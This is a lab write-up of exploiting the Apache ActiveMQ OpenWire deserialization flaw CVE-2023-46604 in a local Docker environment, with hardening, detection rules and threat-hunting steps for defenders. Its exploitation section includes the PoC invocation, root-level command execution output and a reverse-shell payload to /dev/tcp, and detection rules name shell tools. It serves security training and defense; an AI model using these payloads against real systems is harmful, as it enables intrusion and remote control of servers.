# Lab Writeup: Apache ActiveMQ OpenWire Deserialization RCE (CVE-2023-46604)

> **Environment**: Local Docker lab (vulhub/activemq/CVE-2023-46604)
> **Purpose**: Security research & exploit-development practice
> **Status**: ✅ Complete
> **Date**: 2026-05-19

---

## Overview

Apache ActiveMQ ≤ 5.18.2 deserializes attacker-controlled XML over the OpenWire wire protocol on TCP/61616 without restriction. By framing a Spring `ClassPathXmlApplicationContext` reference inside an OpenWire `ExceptionResponse`, an attacker forces the broker to fetch a remote XML config and instantiate any class on its classpath — typically a `ProcessBuilder` bean that runs an arbitrary shell command.

This bug was used in the wild by HelloKitty ransomware (Nov 2023, two weeks after public disclosure).

| Item | Detail |
|------|--------|
| CVE | CVE-2023-46604 |
| CVSS | 10.0 (Critical) |
| Type | Java deserialization (OpenWire wire-protocol) |
| Affected | Apache ActiveMQ < 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3 |
| Default port | 61616/tcp (OpenWire); 8161/tcp (web console) |
| Gadget | `org.springframework.context.support.ClassPathXmlApplicationContext` → remote XML → `ProcessBuilder` |

---

## Attack Chain

```
TCP/61616 → OpenWire ExceptionResponse → ClassPathXmlApplicationContext("http://attacker/poc.xml")
  → Spring loads remote XML → ProcessBuilder.start() → RCE
```

---

## Step-by-Step Reproduction

### 1. Environment Setup

```bash
cd ~/Security/tools/vulhub/activemq/CVE-2023-46604
docker compose up -d
# Web console:   http://127.0.0.1:8161   (admin / admin)
# OpenWire:      127.0.0.1:61616         <-- vulnerable port
```

Confirm the web console reachable to validate startup (only port 61616 is needed afterward).

### 2. Fingerprinting

```bash
curl -sI http://127.0.0.1:8161/admin/index.jsp | grep -i server
# Expected: Server: Jetty(9.4.x)  Set-Cookie: JSESSIONID=...
```

Banner grab on 61616 (OpenWire magic):

```bash
nc -v 127.0.0.1 61616 < /dev/null
# Expected: ActiveMQ\x00\x00 banner
```

### 3. Payload Construction

vulhub ships ready-to-use payloads in this directory:
- `poc.xml` — the Spring bean config that wraps `ProcessBuilder`
- `poc.py` — sends the OpenWire `ExceptionResponse` referencing the remote XML

```bash
# In the vulhub dir, host poc.xml on a local HTTP server
cd ~/Security/tools/vulhub/activemq/CVE-2023-46604
python3 -m http.server 6666
```

Edit `poc.xml` so the `<value>` inside `ProcessBuilder` runs your test command (default sample writes a marker file).

### 4. Exploitation

```bash
python3 poc.py 127.0.0.1 61616 http://127.0.0.1:6666/poc.xml
```

### 5. Verification

```bash
$ docker exec cve-2023-46604-activemq-1 ls -la /tmp/activeMQ-RCE-success
-rw-r--r-- 1 root root 0 May 19 07:15 /tmp/activeMQ-RCE-success

$ docker exec cve-2023-46604-activemq-1 id
uid=0(root) gid=0(root) groups=0(root)

$ docker exec cve-2023-46604-activemq-1 hostname
9e11ad7f1d2e
```

**RCE confirmed** — arbitrary command executed as root inside the broker container.

HTTP server log confirms the broker fetched our payload:
```
172.19.0.2 - - [19/May/2026 03:15:39] "GET /poc.xml HTTP/1.1" 200 -
172.19.0.2 - - [19/May/2026 03:15:39] "GET /poc.xml HTTP/1.1" 200 -
```

(Two fetches — Spring's `ClassPathXmlApplicationContext` loads the XML twice during bean initialization.)

### 6. Reverse Shell (Optional)

```xml
<!-- in poc.xml -->
<list>
  <value>/bin/bash</value>
  <value>-c</value>
  <value>bash -i &gt;&amp; /dev/tcp/172.18.0.1/7777 0&gt;&amp;1</value>
</list>
```

---

## Lessons Learned

| Issue | Root Cause | Solution |
|-------|-----------|----------|
| Container crashes on startup (`NullPointerException` at `CgroupV2Subsystem`) | vulhub's OpenJDK 11 image incompatible with host kernel cgroup v2 (kernel 6.19+) | Add `JAVA_TOOL_OPTIONS=-XX:-UseContainerSupport` env var in docker-compose.yml |
| `poc.xml` request not arriving | broker resolves `127.0.0.1` as itself, not attacker | use `172.19.0.1` (docker bridge gateway from `docker inspect`) |
| `ProcessBuilder` triggers but command silently fails | shell metachars unescaped in raw `<value>` | wrap `/bin/bash -c "..."` and HTML-encode `<` `>` `&` inside XML |
| Spring fetches poc.xml twice | `ClassPathXmlApplicationContext` init lifecycle (refresh + validation) | Not a problem — just expect 2 hits in HTTP log; both trigger the bean |
| `http_proxy` env var causes 503 on `curl http://127.0.0.1:8161` | system proxy intercepts localhost requests | `unset http_proxy` before local curl commands |

---

## Defense

The same OpenWire-deserialization pattern is repeated across other JMS brokers and any product that exposes a non-HTTP wire protocol to untrusted clients. Three angles below mirror the attack so you can shrink the attack surface, catch the exploit live, and find it post-hoc.

### Hardening — reduce the attack surface

1. **Patch to ≥ 5.18.3 / 5.17.6 / 5.16.7 / 5.15.16** (or `≥ 6.0` on the new line). The fix adds a class-name allowlist to OpenWire's `BaseDataStreamMarshaller.createThrowable`.
2. **Bind OpenWire (61616) to `localhost` only** when the broker only talks to local producers — `transportConnectors` in `activemq.xml` accepts `tcp://127.0.0.1:61616`. Internet-exposed 61616 is the precondition for almost every observed in-the-wild exploit.
3. **Require authenticated OpenWire** via `<plugins><simpleAuthenticationPlugin>` so anonymous TCP clients cannot send `ExceptionResponse` frames.
4. **Remove `spring-context` from the broker classpath** if the deployment does not embed Spring. Without `ClassPathXmlApplicationContext`, the public PoC chain has no landing gadget.
5. **Network egress filter** on the broker host — block outbound HTTP from the broker UID. The exploit only succeeds if the broker can fetch `http://attacker/poc.xml`.
6. **Run the broker as a dedicated non-root user** inside a read-only-rootfs container; combine with `--cap-drop=ALL` so the resulting RCE has near-zero blast radius.

### Detection — spot the exploit in flight

1. **Network signature on 61616**: the OpenWire `ExceptionResponse` frame carrying `ClassPathXmlApplicationContext` is highly atypical for healthy traffic. Suricata rule sketch:
   ```
   alert tcp any any -> any 61616 (msg:"ActiveMQ OpenWire ClassPathXmlApplicationContext (CVE-2023-46604)";
     flow:to_server,established;
     content:"org.springframework.context.support.ClassPathXmlApplicationContext";
     classtype:attempted-admin; sid:2046604; rev:1;)
   ```
2. **Egress correlation**: the broker container suddenly fetches an outbound HTTP URL (especially an `*.xml`) right after a 61616 connection from a new client IP. SIEM rule: `src_app=activemq AND http.method=GET AND http.uri ENDS_WITH '.xml'` within 5 s of any new TCP/61616 connection.
3. **Broker logs**: `WARN ... Failed to ack message ... ClassCastException` bursts often coincide with malformed exploit attempts. Alert on > 3/min.
4. **Process genealogy** — the ActiveMQ JVM spawning `/bin/sh`, `bash`, `curl`, `wget`, `nc`, or `python` is exploit-grade. Same Falco shape as the shiro_550 lab:
   ```yaml
   - rule: ActiveMQ JVM spawns shell
     condition: spawned_process and proc.pname=java and proc.cmdline contains "activemq" and proc.name in (bash, sh, nc, curl, wget, python, python3)
     priority: CRITICAL
   ```
5. **Outbound C2 shapes**: long-lived TCP from the broker to non-allowlisted ports (4444, 7777, 9001…). Capture via VPC/NetFlow.

### Threat Hunting — find the breach after the fact

1. **Broker classpath audit**: `find /opt/activemq/lib -newer /opt/activemq/lib/activemq.jar -type f` — any JAR newer than the broker itself is suspect. Real-world cases dropped persistence JARs alongside legitimate ones.
2. **HTTP access logs** (broker host or upstream proxy): grep for `GET /*.xml` from the broker's IP within the last 90 days; reverse-DNS the destination and check threat-intel.
3. **JVM heap dump**: `jmap -dump:format=b,file=heap.hprof <pid>`, load in Eclipse MAT, search for `ProcessBuilder` instances or stale `ClassPathXmlApplicationContext` references — both indicate the gadget chain executed.
4. **File system IOCs**: ActiveMQ writes `/opt/activemq/data/` and `/tmp/` most often; `find /opt/activemq /tmp -newer /opt/activemq/data/activemq.log -type f`.
5. **Auditd / sysmon process tree**: any child of the broker JVM whose argv contains `wget`, `curl`, `base64 -d`, or `chmod +x` is the post-exploitation drop-stage.

---

## Tools & References

- [vulhub/activemq/CVE-2023-46604](https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2023-46604)
- [Apache ActiveMQ security advisory](https://activemq.apache.org/news/cve-2023-46604)
- [Rapid7 — exploited in HelloKitty ransomware campaigns](https://www.rapid7.com/blog/post/2023/11/01/etr-cve-2023-46604-apache-activemq-openwire-protocol-deserialization-remote-code-execution-vulnerability-exploited-in-the-wild/)
- [Trustwave — exploit walkthrough](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2023-46604-rce-vulnerability-in-apache-activemq-being-actively-exploited/)
- [NVD: CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## Disclaimer

This writeup documents authorized security research conducted in an isolated local Docker environment. No production systems were targeted. The purpose is educational — understanding attack techniques to build better defenses.